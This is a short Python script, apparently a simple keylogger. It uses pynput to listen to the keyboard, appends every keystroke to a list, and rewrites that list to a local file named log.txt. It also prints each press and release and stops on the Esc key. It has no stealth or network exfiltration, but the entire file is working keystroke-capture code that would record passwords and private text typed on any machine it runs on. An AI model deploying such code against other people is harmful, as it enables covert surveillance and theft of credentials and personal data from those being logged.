import pynput

from pynput import keyboard

keys = []

def on_press(key):
    keys.append(key)
    write_file(keys)
    
    try:
        print('Alphanumeric key {0} pressed'.format(key.char))
    except AttributeError:
        print('Special key {0} pressed'.format(key))

def write_file(keys):
    with open('log.txt', 'w') as f:
        for key in keys:
            # Removing ''
            k = str(key).replace("'", "")
            f.write(k)
            # Explicitly adding a space after every keystroke for readability
            f.write(' ')

def on_release(key):
    print('{0} released'.format(key))
    if key == keyboard.Key.esc:
        # Stop the listener
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

